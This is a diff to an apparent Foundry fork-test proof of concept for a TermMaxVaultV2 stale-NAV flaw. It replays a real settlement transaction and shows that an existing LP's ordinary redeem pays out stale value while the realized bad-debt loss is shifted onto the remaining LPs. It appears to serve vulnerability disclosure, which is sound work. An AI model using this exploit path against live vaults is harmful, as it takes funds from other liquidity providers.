@@ -9,7 +9,7 @@ import {Math} from "@openzeppelin/contracts/utils/math/Math.sol";
 import {IGearingToken} from "contracts/v1/tokens/IGearingToken.sol";
 import {GtConfig} from "contracts/v1/storage/TermMaxStorage.sol";
 
-/// @notice Minimal ABI for the deployed TermMaxVaultV2 proxy.
+/// @notice Minimal ABI for a deployed TermMaxVaultV2 proxy.
 interface IProductionTermMaxVault is IERC4626 {
     function redeemOrder(address order) external returns (uint256 badDebt, uint256 deliveryCollateral);
     function badDebtMapping(address collateral) external view returns (uint256);
@@ -24,32 +24,33 @@ interface IProductionTermMaxOrder {
 /// @notice Minimal ABI shared by deployed TermMaxMarketV2 instances.
 interface IProductionTermMaxMarket {
     function tokens() external view returns (address ft, address xt, address gt, address collateral, address debtToken);
+    function previewRedeem(uint256 ftAmount) external view returns (uint256 debtTokenAmt, bytes memory deliveryData);
 }
 
 /// @title TermMaxVaultV2 realized-loss / stale-NAV production fork PoC
-/// @notice This harness intentionally deploys no contracts, mints no assets, changes no oracle,
-///         and writes no production storage. It replays a real historical RedeemOrder transaction
-///         on a pinned Ethereum fork and uses shares already held at that historical state.
-/// @dev The test is fail-closed: a zero-bad-debt settlement, fully covered delivery, insufficient
-///      real liquidity, or a mismatch with the historical event makes the PoC fail.
+/// @notice Deploys no contracts, mints no assets, changes no oracle, writes no storage, and
+///         synthesizes no vault shares. It replays one real historical RedeemOrder transaction
+///         at its exact Ethereum pre-transaction state and lets a real historical LP redeem.
+/// @dev Fail-closed: zero bad debt, full economic collateral coverage, insufficient real
+///      liquidity, a historical-event mismatch, or zero measurable loss shift fails the test.
 ///
 /// Required environment variables:
 /// - MAINNET_RPC_URL
+/// - TERM_MAX_VAULT                         deployed TermMaxVaultV2 proxy
 /// - TERM_MAX_SETTLEMENT_TX                 real RedeemOrder transaction hash
 /// - TERM_MAX_PRE_SETTLEMENT_BLOCK          fallback block if tx-hash forks are unsupported
 /// - TERM_MAX_ORDER                         order settled by the transaction
 /// - TERM_MAX_SETTLEMENT_CALLER             historical curator/owner caller
-/// - TERM_MAX_SHARE_SOURCE                  address holding vault shares before settlement
-/// - TERM_MAX_ATTACKER_SHARES               existing shares transferred to the attacker before settlement
+/// - TERM_MAX_SHARE_SOURCE                  real LP holding shares before settlement
+/// - TERM_MAX_ATTACKER_SHARES               subset of that LP's real historical shares
 /// - TERM_MAX_EXPECTED_BAD_DEBT_RAW          badDebt emitted by the real transaction
 /// - TERM_MAX_EXPECTED_DELIVERY_RAW          deliveryCollateral emitted by the real transaction
 contract TermMaxVaultStaleNavForkPoC is Test {
-    address internal constant VAULT = 0xF488ccdf04079cC03183cDB6A147d12Cf97F9317;
     uint256 internal constant USD_BASE = 1e8;
 
-    address internal attacker = makeAddr("existing-lp-attacker");
-
     struct SettlementState {
+        address vaultAddress;
+        address attacker;
         IProductionTermMaxVault vault;
         IERC20 asset;
         IERC4626 pool;
@@ -65,129 +66,135 @@ contract TermMaxVaultStaleNavForkPoC is Test {
     }
 
     function testFork_RealSettlementLetsExistingLPShiftRealizedLossToRemainingLPs() public {
-        SettlementState memory state = _forkFundAndSettle();
+        SettlementState memory state = _forkAndSettle();
 
         uint256 nominalPayout = state.vault.previewRedeem(state.attackerShares);
         assertGt(nominalPayout, 0, "selected existing shares have no redeemable value");
 
         // OpenZeppelin ERC-4626 uses one virtual asset and one virtual share at offset zero.
-        // This computes the amount the same shares would represent if the already-realized
-        // loss had been recognized in totalAssets before redemption.
+        // This is what the same shares would represent had the already-realized loss been
+        // recognized in totalAssets before the LP's ordinary ERC-4626 redemption.
         uint256 economicAssets = state.vault.totalAssets() - state.realizedLoss;
         uint256 fairEconomicPayout =
             Math.mulDiv(state.attackerShares, economicAssets + 1, state.totalSupplyBefore + 1, Math.Rounding.Floor);
         uint256 lossShift = nominalPayout - fairEconomicPayout;
-        assertGt(lossShift, 0, "settlement does not create a profitable stale-NAV exit");
+        assertGt(lossShift, 0, "settlement does not create a measurable stale-NAV exit advantage");
 
-        uint256 liquidCapacity = state.asset.balanceOf(VAULT);
+        uint256 liquidCapacity = state.asset.balanceOf(state.vaultAddress);
         if (address(state.pool) != address(0)) {
-            liquidCapacity += state.pool.maxWithdraw(VAULT);
+            liquidCapacity += state.pool.maxWithdraw(state.vaultAddress);
         }
         assertGe(liquidCapacity, nominalPayout, "insufficient real liquidity for ordinary redeem");
 
         uint256 badDebtBeforeExit = state.vault.badDebtMapping(state.collateral);
-        uint256 collateralBeforeExit = IERC20(state.collateral).balanceOf(VAULT);
-        uint256 assetBeforeExit = state.asset.balanceOf(attacker);
+        uint256 collateralBeforeExit = IERC20(state.collateral).balanceOf(state.vaultAddress);
+        uint256 assetBeforeExit = state.asset.balanceOf(state.attacker);
 
-        vm.prank(attacker);
-        uint256 assetsOut = state.vault.redeem(state.attackerShares, attacker, attacker);
+        vm.prank(state.attacker);
+        uint256 assetsOut = state.vault.redeem(state.attackerShares, state.attacker, state.attacker);
 
         assertEq(assetsOut, nominalPayout, "redeem did not pay the stale nominal quote");
         assertEq(
-            state.asset.balanceOf(attacker) - assetBeforeExit,
+            state.asset.balanceOf(state.attacker) - assetBeforeExit,
             nominalPayout,
-            "attacker did not receive liquid underlying"
+            "real LP did not receive liquid underlying"
         );
 
-        // The early exit neither retires bad debt nor takes the delivered collateral.
-        // Therefore the full unresolved loss remains for fewer outstanding shares.
+        // Ordinary redeem consumes liquid underlying but does not retire the unresolved bad
+        // debt and does not take the delivered collateral; those remain behind for fewer shares.
         assertEq(
             state.vault.badDebtMapping(state.collateral),
             badDebtBeforeExit,
             "ordinary redeem unexpectedly retired bad debt"
         );
         assertEq(
-            IERC20(state.collateral).balanceOf(VAULT),
+            IERC20(state.collateral).balanceOf(state.vaultAddress),
             collateralBeforeExit,
-            "ordinary redeem unexpectedly accepted delivered collateral"
+            "ordinary redeem unexpectedly consumed delivered collateral"
         );
 
         uint256 actualRemainingEconomicAssets = state.vault.totalAssets() - state.realizedLoss;
         uint256 fairRemainingEconomicAssets = economicAssets - fairEconomicPayout;
         uint256 additionalLossForcedOnRemainingLPs = fairRemainingEconomicAssets - actualRemainingEconomicAssets;
 
-        // This is the end-to-end conservation check: every extra raw unit paid to the exiting
-        // LP is removed from the aggregate economic claim of all remaining share holders.
+        // Conservation proof: every extra raw unit received by the early exiter is removed
+        // from the aggregate economic claim of the remaining shares.
         assertApproxEqAbs(
             additionalLossForcedOnRemainingLPs, lossShift, 2, "early-exit gain is not conserved as remaining-LP loss"
         );
 
-        emit log_named_address("vault", VAULT);
+        emit log_named_address("vault", state.vaultAddress);
+        emit log_named_address("real exiting LP", state.attacker);
         emit log_named_address("settled order", vm.envAddress("TERM_MAX_ORDER"));
         emit log_named_uint("real bad debt raw", state.badDebtDelta);
         emit log_named_uint("delivered collateral raw", state.deliveryDelta);
         emit log_named_uint("delivered collateral value in asset raw", state.deliveryValueInAsset);
         emit log_named_uint("realized net loss raw", state.realizedLoss);
-        emit log_named_uint("attacker existing shares", state.attackerShares);
+        emit log_named_uint("existing LP shares redeemed", state.attackerShares);
         emit log_named_uint("ordinary redeem payout raw", nominalPayout);
         emit log_named_uint("fair economic payout raw", fairEconomicPayout);
         emit log_named_uint("loss shifted to remaining LPs raw", lossShift);
     }
 
-    function _forkFundAndSettle() internal returns (SettlementState memory state) {
+    function _forkAndSettle() internal returns (SettlementState memory state) {
         string memory rpc = vm.envString("MAINNET_RPC_URL");
         bytes32 settlementTx = vm.envBytes32("TERM_MAX_SETTLEMENT_TX");
         uint256 fallbackPreBlock = vm.envUint("TERM_MAX_PRE_SETTLEMENT_BLOCK");
 
-        // A transaction-hash fork replays every transaction earlier in the same block and
-        // stops immediately before the selected settlement. Some public RPC providers do
-        // not support this Foundry feature, so the exact pre-block remains an explicit fallback.
+        // Transaction-hash forks stop immediately before the selected transaction while
+        // preserving all earlier transactions in the same block. The block fallback exists
+        // only for providers that do not implement transaction-position forks.
         try vm.createSelectFork(rpc, settlementTx) returns (uint256) {}
         catch {
             vm.createSelectFork(rpc, fallbackPreBlock);
         }
 
-        state.vault = IProductionTermMaxVault(VAULT);
+        state.vaultAddress = vm.envAddress("TERM_MAX_VAULT");
+        state.vault = IProductionTermMaxVault(state.vaultAddress);
         state.asset = IERC20(state.vault.asset());
         state.pool = state.vault.pool();
+        state.attacker = vm.envAddress("TERM_MAX_SHARE_SOURCE");
         state.attackerShares = vm.envUint("TERM_MAX_ATTACKER_SHARES");
 
         address order = vm.envAddress("TERM_MAX_ORDER");
         address settlementCaller = vm.envAddress("TERM_MAX_SETTLEMENT_CALLER");
-        address shareSource = vm.envAddress("TERM_MAX_SHARE_SOURCE");
         uint256 expectedBadDebt = vm.envUint("TERM_MAX_EXPECTED_BAD_DEBT_RAW");
         uint256 expectedDelivery = vm.envUint("TERM_MAX_EXPECTED_DELIVERY_RAW");
 
         assertGt(state.attackerShares, 0, "TERM_MAX_ATTACKER_SHARES is zero");
         assertGe(
-            state.vault.balanceOf(shareSource),
+            state.vault.balanceOf(state.attacker),
             state.attackerShares,
-            "share source did not own selected shares before settlement"
+            "selected LP did not really own these shares before settlement"
         );
 
-        // Transfer only historically existing shares. No deal(), vm.store(), deposit(), mint(),
-        // or direct balance manipulation is used anywhere in this PoC.
-        vm.prank(shareSource);
-        assertTrue(IERC20(VAULT).transfer(attacker, state.attackerShares), "historical share transfer failed");
-        assertEq(state.vault.balanceOf(attacker), state.attackerShares, "attacker shares not funded");
+        // No share transfer is synthesized. The actor is the historical LP itself.
+        state.totalAssetsBefore = state.vault.totalAssets();
+        state.totalSupplyBefore = state.vault.totalSupply();
+        assertGt(state.totalSupplyBefore, state.attackerShares, "no remaining shares after selected exit");
 
-        address market = IProductionTermMaxOrder(order).market();
-        (,, address gtAddress, address collateral, address debtToken) = IProductionTermMaxMarket(market).tokens();
+        address marketAddress = IProductionTermMaxOrder(order).market();
+        IProductionTermMaxMarket market = IProductionTermMaxMarket(marketAddress);
+        (address ft,, address gtAddress, address collateral, address debtToken) = market.tokens();
         assertEq(debtToken, address(state.asset), "order debt token differs from vault asset");
 
         state.gt = IGearingToken(gtAddress);
         state.collateral = collateral;
-        state.totalAssetsBefore = state.vault.totalAssets();
-        state.totalSupplyBefore = state.vault.totalSupply();
+
+        // Value the exact protocol-specific collateral deliveryData at the exact historical
+        // pre-settlement state. This deliberately avoids reconstructing or guessing its ABI.
+        uint256 ftAmount = IERC20(ft).balanceOf(order);
+        (, bytes memory deliveryData) = market.previewRedeem(ftAmount);
+        state.deliveryValueInAsset = _deliveryValueInAsset(state.gt, address(state.asset), deliveryData);
 
         uint256 badDebtBefore = state.vault.badDebtMapping(collateral);
-        uint256 collateralBefore = IERC20(collateral).balanceOf(VAULT);
+        uint256 collateralBefore = IERC20(collateral).balanceOf(state.vaultAddress);
 
         vm.prank(settlementCaller);
         (uint256 badDebtReturned, uint256 deliveryReturned) = state.vault.redeemOrder(order);
 
         state.badDebtDelta = state.vault.badDebtMapping(collateral) - badDebtBefore;
-        state.deliveryDelta = IERC20(collateral).balanceOf(VAULT) - collateralBefore;
+        state.deliveryDelta = IERC20(collateral).balanceOf(state.vaultAddress) - collateralBefore;
 
         assertEq(badDebtReturned, expectedBadDebt, "fork result differs from historical badDebt event");
         assertEq(deliveryReturned, expectedDelivery, "fork result differs from historical delivery event");
@@ -195,8 +202,8 @@ contract TermMaxVaultStaleNavForkPoC is Test {
         assertEq(state.deliveryDelta, expectedDelivery, "collateral balance delta differs from event");
         assertGt(state.badDebtDelta, 0, "selected production settlement has zero bad debt");
 
-        // Root-control assertion: settlement records an irreversible asset shortfall but leaves
-        // the ERC-4626 nominal principal unchanged, so previewRedeem remains stale.
+        // Core invariant violation: the loss is now recorded in badDebtMapping, but the ERC-4626
+        // NAV and share supply have not recognized it at all.
         assertEq(
             state.vault.totalAssets(),
             state.totalAssetsBefore,
@@ -204,24 +211,23 @@ contract TermMaxVaultStaleNavForkPoC is Test {
         );
         assertEq(state.vault.totalSupply(), state.totalSupplyBefore, "settlement changed share supply");
 
-        state.deliveryValueInAsset = _deliveryValueInAsset(state.gt, address(state.asset), state.deliveryDelta);
         assertGt(
             state.badDebtDelta,
             state.deliveryValueInAsset,
-            "delivered collateral fully covers bad debt; no realized net loss"
+            "delivered collateral economically covers the bad debt; no realized net loss"
         );
         state.realizedLoss = state.badDebtDelta - state.deliveryValueInAsset;
         assertLt(state.realizedLoss, state.vault.totalAssets(), "selected loss exceeds nominal vault assets");
     }
 
-    function _deliveryValueInAsset(IGearingToken gt, address asset, uint256 deliveryAmount)
+    function _deliveryValueInAsset(IGearingToken gt, address asset, bytes memory deliveryData)
         internal
         view
         returns (uint256)
     {
-        if (deliveryAmount == 0) return 0;
+        if (deliveryData.length == 0) return 0;
 
-        uint256 collateralValueUsd = gt.getCollateralValue(abi.encode(deliveryAmount));
+        uint256 collateralValueUsd = gt.getCollateralValue(deliveryData);
         GtConfig memory config = gt.getGtConfig();
         (uint256 assetPrice, uint8 assetPriceDecimals) = config.loanConfig.oracle.getPrice(asset);
         require(assetPrice != 0, "protocol debt-token oracle returned zero");
